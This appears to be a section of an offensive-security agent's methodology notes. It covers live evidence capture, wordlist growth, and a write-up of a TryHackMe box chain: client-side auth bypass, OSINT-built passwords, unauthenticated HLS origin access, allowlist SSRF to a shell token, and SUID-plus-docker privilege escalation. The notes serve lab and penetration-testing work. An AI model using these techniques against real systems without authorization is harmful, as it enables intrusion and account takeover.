**Target VIDEO/media -> mp4 into `poc/`, and hand it to the operator EARLY.** If a target yields a
clip (CCTV/camera feed, HLS stream, screen recording), pull the segments and remux to mp4 straight
into `targets/<eng>/poc/` (`ffmpeg -i <in> -c copy poc/<slug>.mp4`), then tell the operator where it
is - a visual puzzle (a shoulder-surf, a code on screen) is far cheaper read by the human than
brute-analyzed frame-by-frame. Frame extraction/OCR is the FALLBACK, not the opening move. (HopSec
Asylum lesson: ~40% of a ~1.8M-token run went to montaging keypad frames the operator read in seconds.)

**Screenshot EVERY successful step as you go (not at the end).** The walkthrough must be report-ready
from the `.md` alone. The moment a step LANDS - valid cred / Pwn3d, a BloodHound edge, a GUI foothold
(RDP desktop, unlocked KeePass, admin panel), a bad permission found, the DA hash, the flag - capture it
LIVE and drop the `![]()` ref inline at that step + in the `## Evidence` gallery. There is NO auto-capture
net anymore: evidence is captured LIVE via `scripts/capture.sh` (ev/req/tmux/burp) straight into `poc/`
the MOMENT a step lands, never at the end. **One-call live path (`capture.sh ev`):** tee the step's output
on the VM, then `scripts/capture.sh ev <eng> <slug> "<request-url>" "<cmd-label>"` - it cards the output
showing BOTH the command and the request URL and pulls the PNG into `poc/` in a single call, so live
capture has no friction (`cmd`+`url` are required, so no card is anonymous). **For a lead from a web
request** (a curl returning creds / a flag / leaked source), the real curl **request+response** is the
artifact - `scripts/capture.sh req <eng> <slug> -- <curl-args>` captures a full-fidelity `curl -iv`
request/response card (crypto-forged? give the exploit a `--curl` mode that emits the concrete curl). For
evidence that should look like a real tmux session run `scripts/capture.sh tmux <eng> <slug> <script.sh>`;
a Burp Repeater req/resp PoC is `scripts/capture.sh burp ...`. `Skill(screenshot)` covers authed/exploited
states (dashboard, vuln firing, the flag) and the narrative `--tmux` session cards. Under the hood:
CLI/tool output -> `shot.py --term` (colored terminal card) or `--tmux` (live tab); GUI/desktop ->
`--window`/`--screen` (or `import -window root` off a headless xfreerdp). Backfilling at the end loses
transient state (sessions, dialogs, one-shot output) - capture at the moment of success. **NEVER hand-write
a tool's output into a `--term` card - that is fabricated evidence.** Capture the REAL stream: if a command
is launched with output redirected (`> log`), the tmux pane stays EMPTY, so `tee` the output into the pane
OR `shot.py --term <the-real-logfile>`. GUI foothold that can't reproduce (RDP session, unlocked KeePass) -
screenshot it live; a box that expires cannot be recaptured. Curate your `poc/` step shots into the
`## Evidence` gallery, or run `python3 scripts/build-walkthrough.py <eng>` to auto-populate that gallery
from every rendered card in `poc/` (it refreshes the Evidence table in place and never touches your narrative).

**Grow the harness wordlist.** If a non-obvious route/file/param cracked the box (one the standard
lists missed, e.g. `/internal`), feed the GENERIC token back so the next box is faster:
`python3 scripts/wordlist-suggest.py` (leak-safe, read-only) then `scripts/wl-add.sh paths <token>`
/ `wl-add.sh params <name>`. Add only generic methodology names - never client-specific branding.

## Lesson: multi-service web escape chain - media-origin BFLA, allowlist-SSRF-to-console, SUID->docker (THM HopSec Asylum)

A themed multi-flag web box (flags submitted to one "escape" endpoint), owned via a chain of
app-logic bugs, not a memory CVE. Load `Skill(hunt-idor)`/`Skill(hunt-ssrf)`/`Skill(hunt-api)`.
- **Client-side-only auth = BAC.** A "flag" endpoint gated only by a client-side `session_check`
  (the JS hides the button) returns the flag when hit directly. Always call the CGI/API endpoint
  raw, never trust the UI gate.
- **OSINT combinator password.** A fake-social app leaked an old password (`Word####$` shape) in a
  post comment + the owner's dog name + birth year. New password = a combinator of those in the
  same shape (`Dogname<year>!`). Build the small custom list from the OSINT, don't grind rockyou.
- **Media-origin path BFLA.** The video API gated an admin camera, but the HLS **origin** (nginx)
  served the same `/hls/<cam>/playlist.m3u8` with NO auth. When an API restricts a stream, test the
  segment/origin server directly - it often skips the API's authz. (The admin feed was a CCTV
  shoulder-surf of a keypad: `ffmpeg -vf fps=10` frames; a Goertzel detector on the ~4kHz keypad
  beep gives the digit COUNT; read the finger position per press.)
- **Allowlist-SSRF that mints a console token.** A manifest leaked a hidden `/v1/ingest/diagnostics`
  endpoint (read the FULL manifest - it was in an `#EXT-X-SESSION-DATA` header). It validated the
  `rtsp_url` host against an allowlist (`vendor-cam.test`), and the allowlisted host was a MAGIC
  trigger that minted a token for a `socat`-backed shell on another port. Reverse the URL filter
  (host/scheme allowlist vs userinfo/alt-loopback), and treat any "diagnostics/ingest/probe"
  endpoint that takes a URL as an SSRF/trigger surface. See [[ssrf]].
- **SUID-that-only-setuid + `sg`/`newgrp` to grab the group.** Privesc from a low svc account: a
  custom SUID binary (`diag_shell`) did `setuid(other_user); execl("/bin/bash")` -> you become that
  UID but KEEP your old groups. If that user is in `docker` (check `/etc/group`), run
  `sg docker -c '<cmd>'` (or `newgrp docker`) to pick up the group -> docker socket -> root file
  access (`docker run -v /:/host ...` / `docker exec` the target container). See [[linux-privesc]].

## Context tools

<!-- auto-wired: documented tools to reach for; do not hand-roll -->
- [[nmap]]
- [[rustscan]]
- [[naabu]]
- [[ffuf]]
- [[feroxbuster]]
- [[gobuster]]
- [[nuclei]]
- [[nikto]]
- [[whatweb]]
- [[arjun]]
- [[dalfox]]
- [[swaks]]
- [[recon]]
- [[nuclei-arsenal]]
- [[wordlists]]
- [[network-services]]
- [[linux-enumeration]]
- [[windows-enumeration]]
- [[windows-privesc]]
- [[password-attacks]]
- [[sqlmap]]
- [[pivoting]]
- [[web-client-attacks]]
- [[metasploit]]
